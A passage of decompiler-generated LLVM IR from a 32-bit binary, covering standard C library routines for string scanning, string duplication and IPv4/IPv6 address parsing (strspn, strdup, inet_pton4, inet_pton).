  %v15_8055ac8 = icmp eq i8 %v2_8055ac8, %v4_8055ac8
  br i1 %v15_8055ac8, label %dec_label_pc_8055b1c, label %dec_label_pc_8055acc

dec_label_pc_8055acc:                             ; preds = %dec_label_pc_8055ac8
  %v1_8055acc = add i32 %v0_8055acc, 1
  %v2_8055acd = urem i32 %v1_8055acc, 4
  %v3_8055acd = icmp eq i32 %v2_8055acd, 0
  %v1_8055acf = icmp eq i1 %v3_8055acd, false
  br i1 %v1_8055acf, label %dec_label_pc_8055ac8, label %dec_label_pc_8055ad1

dec_label_pc_8055ad1:                             ; preds = %entry, %dec_label_pc_8055acc
  %v0_8055ad4 = phi i32 [ %v1_8055acc, %dec_label_pc_8055acc ], [ %v4_8055ac2, %entry ]
  %v2_8055ad8 = mul nuw nsw i32 %v4_8055abe, 256
  %v2_8055adb = or i32 %v2_8055ad8, %v4_8055abe
  %v2_8055adf = mul i32 %v2_8055adb, 65536
  %v2_8055ae2 = or i32 %v2_8055adf, %v2_8055adb
  br label %dec_label_pc_8055ae4

dec_label_pc_8055ae4:                             ; preds = %dec_label_pc_8055b14, %dec_label_pc_8055ae4, %dec_label_pc_8055ad1
  %v0_8055ae8 = phi i32 [ %v0_8055ad4, %dec_label_pc_8055ad1 ], [ %v1_8055ae8, %dec_label_pc_8055ae4 ], [ %v1_8055ae8, %dec_label_pc_8055b14 ]
  %v2_8055ae6 = inttoptr i32 %v0_8055ae8 to i32*
  %v3_8055ae6 = load i32, i32* %v2_8055ae6, align 4
  %v4_8055ae6 = xor i32 %v3_8055ae6, %v2_8055ae2
  %v1_8055ae8 = add i32 %v0_8055ae8, 4
  store i32 %v1_8055ae8, i32* @ecx, align 4
  %v1_8055aeb = add i32 %v4_8055ae6, 2130640639
  %v1_8055af1 = sub i32 -1, %v4_8055ae6
  store i32 %v1_8055af1, i32* @edx, align 4
  %v2_8055af3 = xor i32 %v1_8055aeb, %v1_8055af1
  %v1_8055af5 = and i32 %v2_8055af3, -2130640640
  %v2_8055af5 = icmp eq i32 %v1_8055af5, 0
  br i1 %v2_8055af5, label %dec_label_pc_8055ae4, label %dec_label_pc_8055afc

dec_label_pc_8055afc:                             ; preds = %dec_label_pc_8055ae4
  %v2_8055aff = inttoptr i32 %v0_8055ae8 to i8*
  %v3_8055aff = load i8, i8* %v2_8055aff, align 1
  %v16_8055aff = icmp eq i8 %v3_8055aff, %v4_8055ac8
  br i1 %v16_8055aff, label %dec_label_pc_8055b1c, label %dec_label_pc_8055b04

dec_label_pc_8055b04:                             ; preds = %dec_label_pc_8055afc
  %v1_8055b04 = add i32 %v0_8055ae8, 1
  %v2_8055b07 = inttoptr i32 %v1_8055b04 to i8*
  %v3_8055b07 = load i8, i8* %v2_8055b07, align 1
  %v16_8055b07 = icmp eq i8 %v3_8055b07, %v4_8055ac8
  br i1 %v16_8055b07, label %dec_label_pc_8055b1c, label %dec_label_pc_8055b0c

dec_label_pc_8055b0c:                             ; preds = %dec_label_pc_8055b04
  %v1_8055b0c = add i32 %v0_8055ae8, 2
  %v2_8055b0f = inttoptr i32 %v1_8055b0c to i8*
  %v3_8055b0f = load i8, i8* %v2_8055b0f, align 1
  %v16_8055b0f = icmp eq i8 %v3_8055b0f, %v4_8055ac8
  br i1 %v16_8055b0f, label %dec_label_pc_8055b1c, label %dec_label_pc_8055b14

dec_label_pc_8055b14:                             ; preds = %dec_label_pc_8055b0c
  %v1_8055b14 = add i32 %v0_8055ae8, 3
  %v2_8055b17 = inttoptr i32 %v1_8055b14 to i8*
  %v3_8055b17 = load i8, i8* %v2_8055b17, align 1
  %v16_8055b17 = icmp eq i8 %v3_8055b17, %v4_8055ac8
  %v1_8055b1a = icmp eq i1 %v16_8055b17, false
  br i1 %v1_8055b1a, label %dec_label_pc_8055ae4, label %dec_label_pc_8055b1c

dec_label_pc_8055b1c:                             ; preds = %dec_label_pc_8055ac8, %dec_label_pc_8055b14, %dec_label_pc_8055b0c, %dec_label_pc_8055b04, %dec_label_pc_8055afc
  %v0_8055b1e = phi i32 [ %v1_8055b14, %dec_label_pc_8055b14 ], [ %v1_8055b0c, %dec_label_pc_8055b0c ], [ %v1_8055b04, %dec_label_pc_8055b04 ], [ %v0_8055ae8, %dec_label_pc_8055afc ], [ %v0_8055acc, %dec_label_pc_8055ac8 ]
  store i32 %v0_8055abd, i32* @ebx, align 4
  ret i32 %v0_8055b1e

; uselistorder directives
  uselistorder i32 %v1_8055af1, { 1, 0 }
  uselistorder i32 %v1_8055ae8, { 2, 1, 0 }
  uselistorder i32 %v2_8055adb, { 1, 0 }
  uselistorder i32 %v1_8055acc, { 1, 0, 2 }
  uselistorder i32 %v4_8055ac2, { 2, 1, 0 }
  uselistorder i32 %v4_8055abe, { 1, 0 }
  uselistorder i32 -2130640640, { 1, 0 }
  uselistorder i32 2130640639, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8055b1c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8055ad1, { 1, 0 }
  uselistorder label %dec_label_pc_8055ac8, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_8055b4230 = load i8, i8* %arg1, align 1
  %v4_8055b4434 = icmp eq i8 %v2_8055b4230, 0
  br i1 %v4_8055b4434, label %dec_label_pc_8055b4c, label %dec_label_pc_8055b48.lr.ph

dec_label_pc_8055b48.lr.ph:                       ; preds = %entry
  %v3_8055b4231 = zext i8 %v2_8055b4230 to i32
  %v4_8055b42.pre = load i32, i32* @eax, align 4
  %v5_8055b4232 = and i32 %v4_8055b42.pre, -256
  %v6_8055b4233 = or i32 %v3_8055b4231, %v5_8055b4232
  %v4_8055b29 = ptrtoint i8* %arg1 to i32
  %v1_8055b3418 = inttoptr i32 %arg2 to i8*
  %v4_8055b34.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8055b48

dec_label_pc_8055b2f:                             ; preds = %dec_label_pc_8055b48, %dec_label_pc_8055b33
  %v6_8055b3427 = phi i32 [ %v6_8055b34, %dec_label_pc_8055b33 ], [ %v6_8055b3422, %dec_label_pc_8055b48 ]
  %v2_8055b3426 = phi i8 [ %v2_8055b34, %dec_label_pc_8055b33 ], [ %v2_8055b3419, %dec_label_pc_8055b48 ]
  %v0_8055b3325 = phi i32 [ %v1_8055b33, %dec_label_pc_8055b33 ], [ %arg2, %dec_label_pc_8055b48 ]
  %v15_8055b2f = icmp eq i8 %v2_8055b4237, %v2_8055b3426
  br i1 %v15_8055b2f, label %dec_label_pc_8055b3c, label %dec_label_pc_8055b33

dec_label_pc_8055b33:                             ; preds = %dec_label_pc_8055b2f
  %v1_8055b33 = add i32 %v0_8055b3325, 1
  store i32 %v1_8055b33, i32* @edx, align 4
  %v1_8055b34 = inttoptr i32 %v1_8055b33 to i8*
  %v2_8055b34 = load i8, i8* %v1_8055b34, align 1
  %v3_8055b34 = zext i8 %v2_8055b34 to i32
  %v5_8055b34 = and i32 %v6_8055b3427, -256
  %v6_8055b34 = or i32 %v3_8055b34, %v5_8055b34
  store i32 %v6_8055b34, i32* @ecx, align 4
  %v4_8055b36 = icmp eq i8 %v2_8055b34, 0
  %v1_8055b38 = icmp eq i1 %v4_8055b36, false
  br i1 %v1_8055b38, label %dec_label_pc_8055b2f, label %dec_label_pc_8055b4c

dec_label_pc_8055b3c:                             ; preds = %dec_label_pc_8055b2f
  %v1_8055b40 = add i32 %v0_8055b4c35, 1
  %v1_8055b41 = add i32 %v0_8055b4136, 1
  %v1_8055b42 = inttoptr i32 %v1_8055b41 to i8*
  %v2_8055b42 = load i8, i8* %v1_8055b42, align 1
  %v3_8055b42 = zext i8 %v2_8055b42 to i32
  %v5_8055b42 = and i32 %v6_8055b4238, -256
  %v6_8055b42 = or i32 %v3_8055b42, %v5_8055b42
  %v4_8055b44 = icmp eq i8 %v2_8055b42, 0
  br i1 %v4_8055b44, label %dec_label_pc_8055b4c, label %dec_label_pc_8055b48

dec_label_pc_8055b48:                             ; preds = %dec_label_pc_8055b48.lr.ph, %dec_label_pc_8055b3c
  %v4_8055b34.pre = phi i32 [ %v4_8055b34.pre.pre, %dec_label_pc_8055b48.lr.ph ], [ %v6_8055b3427, %dec_label_pc_8055b3c ]
  %v6_8055b4238 = phi i32 [ %v6_8055b4233, %dec_label_pc_8055b48.lr.ph ], [ %v6_8055b42, %dec_label_pc_8055b3c ]
  %v2_8055b4237 = phi i8 [ %v2_8055b4230, %dec_label_pc_8055b48.lr.ph ], [ %v2_8055b42, %dec_label_pc_8055b3c ]
  %v0_8055b4136 = phi i32 [ %v4_8055b29, %dec_label_pc_8055b48.lr.ph ], [ %v1_8055b41, %dec_label_pc_8055b3c ]
  %v0_8055b4c35 = phi i32 [ 0, %dec_label_pc_8055b48.lr.ph ], [ %v1_8055b40, %dec_label_pc_8055b3c ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8055b3419 = load i8, i8* %v1_8055b3418, align 1
  %v3_8055b3420 = zext i8 %v2_8055b3419 to i32
  %v5_8055b3421 = and i32 %v4_8055b34.pre, -256
  %v6_8055b3422 = or i32 %v3_8055b3420, %v5_8055b3421
  store i32 %v6_8055b3422, i32* @ecx, align 4
  %v4_8055b3623 = icmp eq i8 %v2_8055b3419, 0
  %v1_8055b3824 = icmp eq i1 %v4_8055b3623, false
  br i1 %v1_8055b3824, label %dec_label_pc_8055b2f, label %dec_label_pc_8055b4c

dec_label_pc_8055b4c:                             ; preds = %entry, %dec_label_pc_8055b3c, %dec_label_pc_8055b48, %dec_label_pc_8055b33
  %v0_8055b4c17 = phi i32 [ %v0_8055b4c35, %dec_label_pc_8055b33 ], [ %v0_8055b4c35, %dec_label_pc_8055b48 ], [ 0, %entry ], [ %v1_8055b40, %dec_label_pc_8055b3c ]
  ret i32 %v0_8055b4c17

; uselistorder directives
  uselistorder i32 %v6_8055b3422, { 1, 0 }
  uselistorder i8 %v2_8055b3419, { 1, 2, 0 }
  uselistorder i32 %v1_8055b41, { 1, 0 }
  uselistorder i32 %v6_8055b34, { 1, 0 }
  uselistorder i8 %v2_8055b34, { 1, 2, 0 }
  uselistorder i32 %v1_8055b33, { 2, 1, 0 }
  uselistorder i8 %v2_8055b4230, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055b4c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8055b48, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8055b54 = load i32, i32* @edi, align 4
  %v0_8055b55 = load i32, i32* @esi, align 4
  %v0_8055b56 = load i32, i32* @ebx, align 4
  store i32 %v0_8055b56, i32* %stack_var_-12, align 4
  %v4_8055b57 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055b57, i32* @edi, align 4
  %v3_8055b5f = call i32 @strlen(i8* %arg1)
  %v1_8055b64 = add i32 %v3_8055b5f, 1
  store i32 %v1_8055b64, i32* @esi, align 4
  %v2_8055b6a = call i32 @malloc(i32 %v1_8055b64)
  store i32 %v2_8055b6a, i32* %ebx.global-to-local, align 4
  %v1_8055b74 = icmp eq i32 %v2_8055b6a, 0
  br i1 %v1_8055b74, label %dec_label_pc_8055b84, label %dec_label_pc_8055b78

dec_label_pc_8055b78:                             ; preds = %entry
  %v0_8055b79 = load i32, i32* @esi, align 4
  %v0_8055b7a = load i32, i32* @edi, align 4
  %tmp11 = inttoptr i32 %v2_8055b6a to i16*
  %v6_8055b7c = call i32 @memcpy(i16* %tmp11, i32 %v0_8055b7a, i32 %v0_8055b79)
  %v0_8055b84.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055b84

dec_label_pc_8055b84:                             ; preds = %entry, %dec_label_pc_8055b78
  %v0_8055b84 = phi i32 [ 0, %entry ], [ %v0_8055b84.pre, %dec_label_pc_8055b78 ]
  %v2_8055b86 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055b86, i32* @ebx, align 4
  store i32 %v0_8055b55, i32* @esi, align 4
  store i32 %v0_8055b54, i32* @edi, align 4
  ret i32 %v0_8055b84

; uselistorder directives
  uselistorder i32 %v2_8055b6a, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 10, 7, 6, 17, 16, 15, 1, 9, 8, 14, 13, 4, 12, 11, 5, 3, 2, 0 }
  uselistorder label %dec_label_pc_8055b84, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_8055b8e = load i32, i32* @esi, align 4
  %v0_8055b95 = load i32, i32* @eax, align 4
  store i32 %v0_8055b95, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8055b9b = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8055b9b, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_8055be315 = inttoptr i32 %v0_8055b95 to i8*
  %v2_8055be316 = load i8, i8* %v1_8055be315, align 1
  %v3_8055be317 = sext i8 %v2_8055be316 to i32
  store i32 %v3_8055be317, i32* @ecx, align 4
  %v1_8055be618 = add i32 %v0_8055b95, 1
  store i32 %v1_8055be618, i32* %ebx.global-to-local, align 4
  %v1_8055be719 = icmp eq i8 %v2_8055be316, 0
  %v1_8055be920 = icmp eq i1 %v1_8055be719, false
  br i1 %v1_8055be920, label %dec_label_pc_8055ba6, label %dec_label_pc_8055beb.thread

dec_label_pc_8055beb.thread:                      ; preds = %entry
  br label %dec_label_pc_8055c08

dec_label_pc_8055ba6:                             ; preds = %entry, %dec_label_pc_8055be3.backedge
  %v3_8055be322 = phi i32 [ %v3_8055be3, %dec_label_pc_8055be3.backedge ], [ %v3_8055be317, %entry ]
  %v2_8055be321 = phi i8 [ %v2_8055be3, %dec_label_pc_8055be3.backedge ], [ %v2_8055be316, %entry ]
  %v1_8055ba6 = add nsw i32 %v3_8055be322, -48
  store i32 %v1_8055ba6, i32* %eax.global-to-local, align 4
  %v6_8055bac = icmp ugt i32 %v1_8055ba6, 9
  br i1 %v6_8055bac, label %dec_label_pc_8055bcf, label %dec_label_pc_8055bae

dec_label_pc_8055bae:                             ; preds = %dec_label_pc_8055ba6
  %v0_8055bae = load i32, i32* @esi, align 4
  %v1_8055bae = inttoptr i32 %v0_8055bae to i8*
  %v2_8055bae = load i8, i8* %v1_8055bae, align 1
  %v2_8055bb1 = zext i8 %v2_8055bae to i32
  %v3_8055bb1 = mul nuw nsw i32 %v2_8055bb1, 10
  %v3_8055bb4 = add nsw i32 %v3_8055bb1, %v1_8055ba6
  store i32 %v3_8055bb4, i32* %eax.global-to-local, align 4
  %v6_8055bbd = icmp ugt i32 %v3_8055bb4, 255
  br i1 %v6_8055bbd, label %dec_label_pc_8055c08, label %dec_label_pc_8055bbf

dec_label_pc_8055bbf:                             ; preds = %dec_label_pc_8055bae
  %v1_8055bbf = trunc i32 %v3_8055bb4 to i8
  store i8 %v1_8055bbf, i8* %v1_8055bae, align 1
  %v0_8055bc1 = load i32, i32* @edx, align 4
  %v1_8055bc1 = icmp eq i32 %v0_8055bc1, 0
  %v1_8055bc3 = icmp eq i1 %v1_8055bc1, false
  br i1 %v1_8055bc3, label %dec_label_pc_8055be3.backedge, label %dec_label_pc_8055bc5

dec_label_pc_8055bc5:                             ; preds = %dec_label_pc_8055bbf
  %v0_8055bc5 = load i32, i32* @edi, align 4
  %v1_8055bc5 = add i32 %v0_8055bc5, 1
  store i32 %v1_8055bc5, i32* @edi, align 4
  %v1_8055bc6 = add i32 %v0_8055bc5, -3
  %v6_8055bc6 = sub i32 2, %v0_8055bc5
  %v7_8055bc6 = and i32 %v6_8055bc6, %v1_8055bc5
  %v8_8055bc6 = icmp slt i32 %v7_8055bc6, 0
  %v9_8055bc6 = icmp eq i32 %v1_8055bc6, 0
  %v10_8055bc6 = icmp slt i32 %v1_8055bc6, 0
  %v3_8055bc9 = icmp eq i1 %v10_8055bc6, %v8_8055bc6
  %v4_8055bc9 = icmp eq i1 %v9_8055bc6, false
  %v5_8055bc9 = and i1 %v4_8055bc9, %v3_8055bc9
  br i1 %v5_8055bc9, label %dec_label_pc_8055c08, label %dec_label_pc_8055bcb

dec_label_pc_8055bcb:                             ; preds = %dec_label_pc_8055bc5
  %v1_8055bcb = and i32 %v0_8055bc1, -256
  %v2_8055bcb = or i32 %v1_8055bcb, 1
  store i32 %v2_8055bcb, i32* @edx, align 4
  br label %dec_label_pc_8055be3.backedge

dec_label_pc_8055bcf:                             ; preds = %dec_label_pc_8055ba6
  %v9_8055bcf = icmp eq i8 %v2_8055be321, 46
  %v1_8055bd2 = icmp eq i1 %v9_8055bcf, false
  br i1 %v1_8055bd2, label %dec_label_pc_8055c08, label %dec_label_pc_8055bd4

dec_label_pc_8055bd4:                             ; preds = %dec_label_pc_8055bcf
  %v0_8055bd4 = load i32, i32* @edx, align 4
  %v1_8055bd4 = icmp eq i32 %v0_8055bd4, 0
  br i1 %v1_8055bd4, label %dec_label_pc_8055c08, label %dec_label_pc_8055bd8

dec_label_pc_8055bd8:                             ; preds = %dec_label_pc_8055bd4
  %v0_8055bd8 = load i32, i32* @edi, align 4
  %v9_8055bd8 = icmp eq i32 %v0_8055bd8, 4
  br i1 %v9_8055bd8, label %dec_label_pc_8055c08, label %dec_label_pc_8055bdd

dec_label_pc_8055bdd:                             ; preds = %dec_label_pc_8055bd8
  %v0_8055bdd = load i32, i32* @esi, align 4
  %v1_8055bdd = add i32 %v0_8055bdd, 1
  store i32 %v1_8055bdd, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_8055be0 = inttoptr i32 %v1_8055bdd to i8*
  store i8 0, i8* %v1_8055be0, align 1
  br label %dec_label_pc_8055be3.backedge

dec_label_pc_8055be3.backedge:                    ; preds = %dec_label_pc_8055bdd, %dec_label_pc_8055bcb, %dec_label_pc_8055bbf
  %v0_8055be3.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055be3 = inttoptr i32 %v0_8055be3.pre to i8*
  %v2_8055be3 = load i8, i8* %v1_8055be3, align 1
  %v3_8055be3 = sext i8 %v2_8055be3 to i32
  store i32 %v3_8055be3, i32* @ecx, align 4
  %v1_8055be6 = add i32 %v0_8055be3.pre, 1
  store i32 %v1_8055be6, i32* %ebx.global-to-local, align 4
  %v1_8055be7 = icmp eq i8 %v2_8055be3, 0
  %v1_8055be9 = icmp eq i1 %v1_8055be7, false
  br i1 %v1_8055be9, label %dec_label_pc_8055ba6, label %dec_label_pc_8055beb

dec_label_pc_8055beb:                             ; preds = %dec_label_pc_8055be3.backedge
  %v0_8055beb.pre = load i32, i32* @edi, align 4
  %v7_8055bee = icmp sgt i32 %v0_8055beb.pre, 3
  br i1 %v7_8055bee, label %dec_label_pc_8055bf0, label %dec_label_pc_8055c08

dec_label_pc_8055bf0:                             ; preds = %dec_label_pc_8055beb
  %v0_8055bf0 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_8055b9b, i32* %eax.global-to-local, align 4
  %v3_8055bf9 = bitcast i32* %stack_var_-20 to i16*
  %v4_8055bf9 = call i32 @memcpy(i16* %v3_8055bf9, i32 4, i32 %v0_8055bf0)
  br label %dec_label_pc_8055c0a

dec_label_pc_8055c08:                             ; preds = %dec_label_pc_8055bd8, %dec_label_pc_8055bd4, %dec_label_pc_8055bcf, %dec_label_pc_8055bc5, %dec_label_pc_8055bae, %dec_label_pc_8055beb.thread, %dec_label_pc_8055beb
  br label %dec_label_pc_8055c0a

dec_label_pc_8055c0a:                             ; preds = %dec_label_pc_8055bf0, %dec_label_pc_8055c08
  %storemerge = phi i32 [ 0, %dec_label_pc_8055c08 ], [ 1, %dec_label_pc_8055bf0 ]
  %v0_8055c11 = phi i32 [ 0, %dec_label_pc_8055c08 ], [ 1, %dec_label_pc_8055bf0 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8055b8e, i32* @esi, align 4
  ret i32 %v0_8055c11

; uselistorder directives
  uselistorder i32 %v3_8055be3, { 1, 0 }
  uselistorder i8 %v2_8055be3, { 1, 2, 0 }
  uselistorder i32 %v1_8055bc6, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 255, { 2, 1, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8055c0a, { 1, 0 }
  uselistorder label %dec_label_pc_8055c08, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8055ba6, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8055c12 = load i32, i32* @ebp, align 4
  %v0_8055c13 = load i32, i32* @edi, align 4
  %v0_8055c14 = load i32, i32* @esi, align 4
  %v0_8055c15 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8055c1d = ptrtoint i8* %arg2 to i32
  store i32 %v4_8055c1d, i32* @edi, align 4
  %v9_8055c21 = icmp eq i32 %arg1, 2
  br i1 %v9_8055c21, label %dec_label_pc_8055c31, label %dec_label_pc_8055c26

dec_label_pc_8055c26:                             ; preds = %entry
  %v9_8055c26 = icmp eq i32 %arg1, 10
  %v1_8055c29 = icmp eq i1 %v9_8055c26, false
  br i1 %v1_8055c29, label %dec_label_pc_8055dc2, label %dec_label_pc_8055c41

dec_label_pc_8055c31:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_8055c1d, i32* @eax, align 4
  %v3_8055c37 = call i32 @inet_pton4(i32 %v0_8055c15, i32 %v0_8055c14, i32 %v0_8055c13)
  store i32 %v3_8055c37, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055dd4

dec_label_pc_8055c41:                             ; preds = %dec_label_pc_8055c26
  %v2_8055c46 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055c46, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_8055c4b = call i32 @__GI_memset(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_8055c4b, i32* @ebx, align 4
  %v2_8055c52 = add i32 %v5_8055c4b, 16
  store i32 %v2_8055c52, i32* %eax.global-to-local, align 4
  %v0_8055c5c = load i32, i32* @edi, align 4
  %v1_8055c5c = inttoptr i32 %v0_8055c5c to i8*
  %v2_8055c5c = load i8, i8* %v1_8055c5c, align 1
  %v11_8055c5c = icmp eq i8 %v2_8055c5c, 58
  %v1_8055c5f = icmp eq i1 %v11_8055c5c, false
  br i1 %v1_8055c5f, label %dec_label_pc_8055cf2, label %dec_label_pc_8055c61

dec_label_pc_8055c61:                             ; preds = %dec_label_pc_8055c41
  %v1_8055c61 = add i32 %v0_8055c5c, 1
  store i32 %v1_8055c61, i32* @edi, align 4
  %v1_8055c62 = inttoptr i32 %v1_8055c61 to i8*
  %v2_8055c62 = load i8, i8* %v1_8055c62, align 1
  %v11_8055c62 = icmp eq i8 %v2_8055c62, 58
  %v1_8055c65 = icmp eq i1 %v11_8055c62, false
  br i1 %v1_8055c65, label %dec_label_pc_8055dd2, label %dec_label_pc_8055cf2

dec_label_pc_8055c79:                             ; preds = %dec_label_pc_8055d32
  %v4_8055c81 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8060f94.801, i32 0, i32 0), i32 %v2_8055d39)
  store i32 %v4_8055c81, i32* %eax.global-to-local, align 4
  %v0_8055c86 = load i32, i32* @edi, align 4
  %v1_8055c86 = add i32 %v0_8055c86, 1
  store i32 %v1_8055c86, i32* @edi, align 4
  %v1_8055c8a = icmp eq i32 %v4_8055c81, 0
  br i1 %v1_8055c8a, label %dec_label_pc_8055ca9, label %dec_label_pc_8055c8e

dec_label_pc_8055c8e:                             ; preds = %dec_label_pc_8055c79
  %v0_8055c8e = load i32, i32* @ebp, align 4
  %v2_8055c8e = mul i32 %v0_8055c8e, 16
  %v1_8055c91 = add i32 %v4_8055c81, -134614932
  store i32 %v1_8055c91, i32* %eax.global-to-local, align 4
  %v2_8055c96 = or i32 %v2_8055c8e, %v1_8055c91
  store i32 %v2_8055c96, i32* @ebp, align 4
  %tmp126 = icmp ult i32 %v2_8055c96, 65536
  br i1 %tmp126, label %dec_label_pc_8055d32.outer, label %dec_label_pc_8055dd2

dec_label_pc_8055d32.outer:                       ; preds = %dec_label_pc_8055c8e, %dec_label_pc_8055cf2
  %v0_8055d3536 = phi i32 [ %v1_8055c86, %dec_label_pc_8055c8e ], [ %stack_var_-36.0.in, %dec_label_pc_8055cf2 ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_8055c8e ], [ %stack_var_-44.0, %dec_label_pc_8055cf2 ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_8055c8e ], [ %stack_var_-36.0, %dec_label_pc_8055cf2 ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_8055c8e ], [ 0, %dec_label_pc_8055cf2 ]
  %v4_8055cae = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_8055cb3 = icmp eq i1 %v4_8055cae, false
  br label %dec_label_pc_8055d32

dec_label_pc_8055ca9:                             ; preds = %dec_label_pc_8055c79
  %v0_8055ca9 = load i32, i32* @esi, align 4
  %v9_8055ca9 = icmp eq i32 %v0_8055ca9, 58
  %v1_8055cac = icmp eq i1 %v9_8055ca9, false
  br i1 %v1_8055cac, label %dec_label_pc_8055cfe, label %dec_label_pc_8055cae

dec_label_pc_8055cae:                             ; preds = %dec_label_pc_8055ca9
  br i1 %v1_8055cb3, label %dec_label_pc_8055cca, label %dec_label_pc_8055cb5

dec_label_pc_8055cb5:                             ; preds = %dec_label_pc_8055cae
  %v5_8055cb5 = icmp eq i8* %stack_var_-44.1, null
  %v1_8055cba = icmp eq i1 %v5_8055cb5, false
  br i1 %v1_8055cba, label %dec_label_pc_8055dd2, label %dec_label_pc_8055cc0

dec_label_pc_8055cc0:                             ; preds = %dec_label_pc_8055cb5
  %v0_8055cc0 = load i32, i32* @ebx, align 4
  %v5_8055cc0 = inttoptr i32 %v0_8055cc0 to i8*
  %v5_8055cc4 = inttoptr i32 %v1_8055c86 to i8*
  br label %dec_label_pc_8055d32

dec_label_pc_8055cca:                             ; preds = %dec_label_pc_8055cae
  %v1_8055cca = inttoptr i32 %v1_8055c86 to i8*
  %v2_8055cca = load i8, i8* %v1_8055cca, align 1
  %v3_8055cca = icmp eq i8 %v2_8055cca, 0
  br i1 %v3_8055cca, label %dec_label_pc_8055dd2, label %dec_label_pc_8055cd3

dec_label_pc_8055cd3:                             ; preds = %dec_label_pc_8055cca
  %v0_8055cd3 = load i32, i32* @ebx, align 4
  %v1_8055cd3 = add i32 %v0_8055cd3, 2
  store i32 %v1_8055cd3, i32* @edx, align 4
  %v6_8055cda = icmp ugt i32 %v1_8055cd3, %v2_8055c52
  br i1 %v6_8055cda, label %dec_label_pc_8055dd2, label %dec_label_pc_8055ce0

dec_label_pc_8055ce0:                             ; preds = %dec_label_pc_8055cd3
  %v0_8055ce0 = load i32, i32* @ebp, align 4
  %v2_8055ce2 = udiv i32 %v0_8055ce0, 256
  %v4_8055ce2 = trunc i32 %v2_8055ce2 to i8
  %v3_8055ce5 = inttoptr i32 %v0_8055cd3 to i8*
  store i8 %v4_8055ce2, i8* %v3_8055ce5, align 1
  %v0_8055ce7 = load i32, i32* @ebp, align 4
  store i32 %v0_8055ce7, i32* %eax.global-to-local, align 4
  %v1_8055ce9 = trunc i32 %v0_8055ce7 to i8
  %v2_8055ce9 = load i32, i32* @ebx, align 4
  %v3_8055ce9 = add i32 %v2_8055ce9, 1
  %v4_8055ce9 = inttoptr i32 %v3_8055ce9 to i8*
  store i8 %v1_8055ce9, i8* %v4_8055ce9, align 1
  %v0_8055cec = load i32, i32* @edx, align 4
  store i32 %v0_8055cec, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8055cf2

dec_label_pc_8055cf2:                             ; preds = %dec_label_pc_8055c41, %dec_label_pc_8055c61, %dec_label_pc_8055ce0
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_8055ce0 ], [ %v1_8055c61, %dec_label_pc_8055c61 ], [ %v0_8055c5c, %dec_label_pc_8055c41 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_8055ce0 ], [ null, %dec_label_pc_8055c61 ], [ null, %dec_label_pc_8055c41 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8055d32.outer

dec_label_pc_8055cfe:                             ; preds = %dec_label_pc_8055ca9
  %v9_8055cfe = icmp eq i32 %v0_8055ca9, 46
  %v1_8055d01 = icmp eq i1 %v9_8055cfe, false
  br i1 %v1_8055d01, label %dec_label_pc_8055dd2, label %dec_label_pc_8055d07

dec_label_pc_8055d07:                             ; preds = %dec_label_pc_8055cfe
  %v0_8055d07 = load i32, i32* @ebx, align 4
  %v1_8055d07 = add i32 %v0_8055d07, 4
